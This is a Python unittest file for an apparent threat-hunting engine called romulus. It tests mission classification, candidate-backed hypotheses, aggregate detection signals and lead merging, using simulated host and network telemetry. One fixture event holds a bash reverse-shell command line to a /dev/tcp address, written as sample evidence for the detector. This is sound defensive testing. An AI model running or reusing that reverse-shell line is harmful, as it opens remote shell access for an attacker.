import tempfile
import unittest
from dataclasses import replace
from pathlib import Path


def _engine(root: Path, *, use_ollama: bool = False):
    from romulus.config import Settings
    from romulus.investigation.workflow import HuntEngine
    from romulus.store import Store

    settings = replace(
        Settings.from_env(),
        home=root,
        data_dir=root / "data",
        logs_dir=root / "logs",
        reports_dir=root / "reports",
    )
    return HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=False, use_ollama=use_ollama)


def _planning_state(objective: str):
    return {
        "hunt_id": "HUNT-PLAN",
        "objective": objective,
        "hypotheses": [],
        "host": [],
        "network": [],
        "evidence": [],
        "coverage": {},
        "lead_catalog": [],
        "reasoning_history": [],
        "stage_history": [],
        "tool_runs": [],
        "source_errors": [],
        "tool_calls": 0,
        "started_epoch": 0,
    }


class MissionModeTests(unittest.TestCase):
    def test_mission_classifier_distinguishes_direction_from_broad_discovery(self):
        from romulus.investigation.workflow import _mission_is_directed

        self.assertFalse(_mission_is_directed("Hunt for threats across all available telemetry"))
        self.assertFalse(_mission_is_directed("Find malicious actors on the mission partner network"))
        self.assertTrue(_mission_is_directed("Hunt for SMB lateral movement"))
        self.assertTrue(_mission_is_directed("Investigate activity involving 10.20.30.40"))
        self.assertTrue(_mission_is_directed("Look for PowerShell encoded commands"))

    def test_undirected_plan_creates_no_hypothesis_or_model_call(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("undirected pre-telemetry planning called a model")

            result = engine._plan(_planning_state("Hunt for threats across all available telemetry"))

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["lead_catalog"], [])
            self.assertEqual(result["reasoning_history"][0]["basis"], "deterministic_telemetry_discovery")

    def test_undirected_reasoning_does_not_call_model_without_a_candidate(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("candidate-free undirected reasoning called a model")
            state = _planning_state("Hunt for threats across all telemetry")
            state.update({
                "mission_mode": "undirected",
                "candidate_leads": [],
                "search_artifacts": [],
                "search_fingerprints": [],
                "completed_leads": [],
                "lead_queue": [],
                "depth": 0,
                "coverage": {"search_fields": {"elasticsearch": ["process.name"]}},
            })

            result = engine._reason(state)

            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["termination_reason"], "coverage_frontier_exhausted")

    def test_directed_plan_labels_operator_direction_basis(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory))

            result = engine._plan(_planning_state("Hunt for SMB lateral movement"))

            self.assertEqual(result["mission_mode"], "directed")
            self.assertTrue(result["hypotheses"])
            self.assertTrue(all(item["basis"] == "operator_direction" for item in result["hypotheses"]))


class CandidateHypothesisTests(unittest.TestCase):
    def test_observed_candidate_creates_only_candidate_backed_hypothesis(self):
        event = {
            "evidence_id": "EV-CHAIN",
            "source": "elasticsearch",
            "observed_at": "2026-10-12T12:00:00Z",
            "asset": "srv-01",
            "observation": "process execution",
            "raw": {
                "host": {"name": "srv-01"},
                "process": {
                    "executable": "/tmp/.cache/x",
                    "command_line": "bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
                },
            },
        }
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory))
            state = _planning_state("Hunt for threats across all available telemetry")
            state.update({
                "mission_mode": "undirected",
                "host": [event],
                "findings": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "candidate_leads": [],
            })

            result = engine._analyze(state)

            candidate_ids = {item["candidate_id"] for item in result["candidate_leads"]}
            self.assertTrue(result["hypotheses"])
            self.assertTrue(all(item.get("basis") == "observed_candidate" for item in result["hypotheses"]))
            self.assertTrue(all(set(item.get("basis_candidate_ids", [])) <= candidate_ids for item in result["hypotheses"]))
            self.assertTrue(all(item.get("basis_evidence_ids") for item in result["hypotheses"]))
            self.assertTrue(all(item.get("candidate_id") for item in result["lead_catalog"]))


class AggregateSignalTests(unittest.TestCase):
    def test_every_aggregate_catalog_analytic_has_a_reachable_signal(self):
        from romulus.intelligence.analytics import summarize_evidence
        from romulus.intelligence.behavior_catalog import build_candidate_queue, load_behavior_catalog

        host, network = _aggregate_fixture()
        catalog = load_behavior_catalog()
        summary = summarize_evidence(host, network, limit=50)
        expected_signals = {
            value
            for analytic in catalog["analytics"]
            if analytic["source"] == "aggregate"
            for predicate in analytic["match"].get("any", []) + analytic["match"].get("all", [])
            for value in predicate.get("values", [])
        }
        emitted_signals = {
            signal for signal, rows in summary.get("aggregate_signals", {}).items() if rows
        }
        self.assertEqual(expected_signals - emitted_signals, set())

        candidates = build_candidate_queue(host + network, catalog, {"indicators": []}, summary)
        aggregate_ids = {item["id"] for item in catalog["analytics"] if item["source"] == "aggregate"}
        matched_ids = {item.get("analytic_id") for item in candidates}
        self.assertEqual(aggregate_ids - matched_ids, set())


class CandidateStateTests(unittest.TestCase):
    def test_candidate_merge_preserves_disposition_follow_up_status_and_history(self):
        from romulus.intelligence.behavior_catalog import (
            build_candidate_queue,
            load_behavior_catalog,
            merge_candidate_queue,
        )

        event = {
            "evidence_id": "EV-STATE",
            "source": "elasticsearch",
            "observed_at": "2026-10-12T12:00:00Z",
            "asset": "srv-01",
            "observation": "process execution",
            "raw": {"host": {"name": "srv-01"}, "process": {"executable": "/tmp/tool"}},
        }
        catalog = load_behavior_catalog()
        prior = build_candidate_queue([event], catalog, {"indicators": []})
        target = next(item for item in prior if item["analytic_id"] == "BH-XPLAT-001")
        target["disposition"] = "investigating"
        target["follow_ups"][0]["status"] = "completed"
        target["follow_ups"][0]["history"].append({"search_id": "C-1", "status": "completed"})

        refreshed = build_candidate_queue([event], catalog, {"indicators": []})
        merged = merge_candidate_queue(prior, refreshed)
        current = next(item for item in merged if item["candidate_id"] == target["candidate_id"])

        self.assertEqual(current["disposition"], "investigating")
        self.assertEqual(current["follow_ups"][0]["status"], "completed")
        self.assertEqual(current["follow_ups"][0]["history"][0]["search_id"], "C-1")

    def test_candidate_aware_closure_rejects_open_high_priority_lead(self):
        from romulus.intelligence.analytics import build_coverage_ledger

        candidate = {
            "candidate_id": "CL-OPEN",
            "priority_tier": "high",
            "disposition": "investigating",
            "finding_ids": [],
            "follow_ups": [{"follow_up_id": "FU-1", "intent": "Check context", "status": "pending", "history": []}],
        }
        open_ledger = build_coverage_ledger([], [], [], [], True, True, [candidate])
        self.assertFalse(open_ledger["closure_ready"])
        self.assertEqual(open_ledger["open_candidate_ids"], ["CL-OPEN"])

        candidate["disposition"] = "corroborated"
        candidate["finding_ids"] = ["F-1"]
        candidate["follow_ups"][0]["status"] = "completed"
        closed_ledger = build_coverage_ledger([], [], [], [], True, True, [candidate])
        self.assertTrue(closed_ledger["closure_ready"])

    def test_model_hypothesis_accepts_visible_candidate_id_and_rejects_unknown_id(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory))
            state = _planning_state("Hunt for threats")
            state["candidate_leads"] = [{"candidate_id": "CL-VISIBLE", "evidence_ids": ["EV-1"]}]
            proposal = {
                "title": "Follow visible candidate",
                "technique_id": "T1059",
                "rationale": "The visible deterministic candidate warrants a bounded execution-context test.",
                "expected_host": ["Process execution context"],
                "expected_network": [],
                "benign_explanations": ["Authorized administration"],
                "priority": 4,
                "basis_evidence_ids": ["CL-VISIBLE"],
            }
            added = engine._append_model_hypotheses(state, [proposal], {"CL-VISIBLE"})
            self.assertEqual(len(added), 1)
            self.assertEqual(state["hypotheses"][0]["basis_candidate_ids"], ["CL-VISIBLE"])
            self.assertEqual(state["hypotheses"][0]["basis_evidence_ids"], [])

            rejected = dict(proposal, title="Unsupported guess", basis_evidence_ids=["CL-INVENTED"])
            self.assertEqual(engine._append_model_hypotheses(state, [rejected], {"CL-VISIBLE"}), [])


def _aggregate_fixture():
    def host_event(identifier, minute, asset, **raw):
        return {
            "evidence_id": identifier,
            "source": "elasticsearch",
            "observed_at": f"2026-10-12T12:{minute:02d}:00Z",
            "asset": asset,
            "observation": "host event",
            "raw": raw,
        }

    def network_event(identifier, minute, src, dst, port, protocol="tcp", byte_count=800, **raw):
        body = {
            "source": {"ip": src},
            "destination": {"ip": dst, "port": port},
            "network": {"protocol": protocol, "bytes": byte_count},
        }
        body.update(raw)
        return {
            "evidence_id": identifier,
            "source": "arkime",
            "observed_at": f"2026-10-12T12:{minute:02d}:00Z",
            "asset": dst,
            "observation": "network event",
            "raw": body,
        }

    host = [
        host_event("EV-FAIL", 0, "10.0.0.20", event={"code": "4625"}, user={"name": "admin"}, source={"ip": "10.0.0.10"}),
        host_event("EV-SUCCESS", 1, "10.0.0.20", event={"code": "4624"}, user={"name": "admin"}, source={"ip": "10.0.0.10"}),
        host_event("EV-PRIV", 2, "10.0.0.20", event={"code": "4672"}, user={"name": "admin"}),
        host_event("EV-EXEC", 3, "10.0.0.20", event={"code": "4688"}, user={"name": "admin"}, process={"name": "raretool", "command_line": "raretool --run"}),
        host_event("EV-STAGE", 10, "10.0.0.10", event={"code": "4688"}, process={"name": "7z", "command_line": "7z a archive.7z C:\\Sensitive"}),
    ]
    for index in range(4):
        host.append(host_event(
            f"EV-AUTH-{index}", 4 + index, f"10.0.0.{30 + index}",
            event={"code": "4624"}, user={"name": "operator"}, source={"ip": "10.0.0.9"},
        ))

    network = [
        network_event("EV-REMOTE", 2, "10.0.0.10", "10.0.0.20", 445, "smb"),
        network_event("EV-DNS-ENTROPY", 11, "10.0.0.10", "8.8.8.8", 53, "dns", dns={"question": {"name": "a9f3k2m8q7w4z6x1c5v0b2n8.example.com"}}),
        network_event("EV-MISMATCH", 12, "10.0.0.10", "8.8.4.4", 443, "dns"),
        network_event("EV-RARE", 13, "10.0.0.20", "93.184.216.34", 443, "https", 900),
        network_event("EV-TRANSFER", 15, "10.0.0.10", "1.1.1.1", 443, "https", 8_000_000),
    ]
    for index in range(5):
        network.append(network_event(
            f"EV-NX-{index}", 20 + index, "10.0.0.10", "8.8.8.8", 53, "dns",
            dns={"question": {"name": f"missing-{index}.example.com"}, "response_code": "NXDOMAIN"},
        ))
    for index in range(5):
        network.append(network_event(f"EV-FAN-{index}", 30 + index, "10.0.0.50", f"10.0.1.{index + 1}", 445, "smb"))
    for index, minute in enumerate((40, 44, 48, 52)):
        network.append(network_event(f"EV-PER-{index}", minute, "10.0.0.60", "203.0.113.20", 443, "tls"))
    return host, network


if __name__ == "__main__":
    unittest.main()
